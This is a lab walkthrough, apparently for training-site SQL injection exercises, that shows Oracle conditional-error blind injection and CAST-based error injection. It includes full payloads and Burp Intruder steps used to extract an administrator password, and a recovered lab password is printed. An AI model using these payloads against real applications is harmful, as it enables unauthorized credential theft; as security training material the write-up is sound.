<img src="images/image69.png" alt="third" width="500">

**Step1**

Click on any categories

**Step2**

Send request in repeater as in previous labs.

**Step3.**

Adding single quote for testing

<img src="images/image70.png" alt="third" width="700">

Adding double quote ' '

<img src="images/image71.png" alt="third" width="700">

**Step4**

Here it is clear that it is interpreting it as a query

<img src="images/image72.png" alt="third" width="700">

So we try with

<img src="images/image73.png" alt="third" width="700">

By using `'||(SELECT '' FROM DUAL)||'`  this statement it contain DUAL keyword it is clear that the Website use oracle database.

Because by replacing Dual with table name it gives error.

**Step5**

Now we try to retrieve rowone from usertable

`'|| (SELECT '' FROM USER WHERE ROWNUM=1)||'`

Returning more than one row will break concatenation

<img src="images/image74.png" alt="third" width="700">

**Step6**

Now we try

`'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'`

<img src="images/image75.png" alt="third" width="700">

Here we have error because if condition is execute.

Now we try

`'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'`

<img src="images/image76.png" alt="third" width="700">

**Step7**

Confirming the user administrator is present

`'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'`

Or use

`'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'`

Then the out should give error

<img src="images/image77.png" alt="third" width="700">

**Step8**

Finding length of password

`'||(SELECT CASE WHEN LENGTH(password)>1 THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'`

<img src="images/image78.png" alt="third" width="700">

`Here we see the error because the password length is greater then 1`

To find the exact length we use intruder select.

Select the 1

`'||(SELECT CASE WHEN LENGTH(password)>1 THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'`

<img src="images/image79.png" alt="third" width="900">

Payload setting

<img src="images/image80.png" alt="third" width="500">

From the result it is clear that password length is 20 because we get okay response after 200

<img src="images/image81.png" alt="third" width="500">

**Step9**

Now we find password for each index

`'||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'`

This query is used to find password for first index if the result is error then we say the password is correct.

To find password for all index we user cluster bomb attack in burpsuite.

And select the password index value and character value for payload position.

<img src="images/image82.png" alt="third" width="900">

Payload 1 setting

<img src="images/image83.png" alt="third" width="500">

Payload2 setting

<img src="images/image84.png" alt="third" width="500">

Applying filter search only server error.

<img src="images/image85.png" alt="third" width="500">

Password:8vo43nhqeatkzqu386ht

<img src="images/image86.png" alt="third" width="500">

**Step 1:**

Click on any categories as in previous lab

**Step2:**

Send the response of the request to repeater.

<img src="images/image87.png" alt="third" width="500">

**Step3**

Add single quote and se result '

<img src="images/image88.png" alt="third" width="500">

We see error In response and  we have

<img src="images/image89.png" alt="third" width="500">

Now when we replace `'` with` '-- `the error remove

<img src="images/image90.png" alt="third" width="700">

**Step4:**

Now we add generic query

`' AND CAST((SELECT 1) AS int)--`

<img src="images/image91.png" alt="third" width="500">

We have response

<img src="images/image92.png" alt="third" width="500">

So we use

`' AND 1=CAST((SELECT 1) AS int)--`

<img src="images/image93.png" alt="third" width="700">

**Step5:**

`' AND 1=CAST((SELECT username FROM users) AS int)--`

<img src="images/image94.png" alt="third" width="700">

In response we have error message

<img src="images/image95.png" alt="third" width="500">

So we remove tracking id

<img src="images/image96.png" alt="third" width="500">

We have response

<img src="images/image97.png" alt="third" width="500">

**Step 6**

As it return more then I row we restrict it to 1

`' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--`

<img src="images/image98.png" alt="third" width="500">

Response

<img src="images/image99.png" alt="third" width="500">

So we extract password using

`' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--`

<img src="images/image100.png" alt="third" width="500">

In response we have

<img src="images/image101.png" alt="third" width="500">
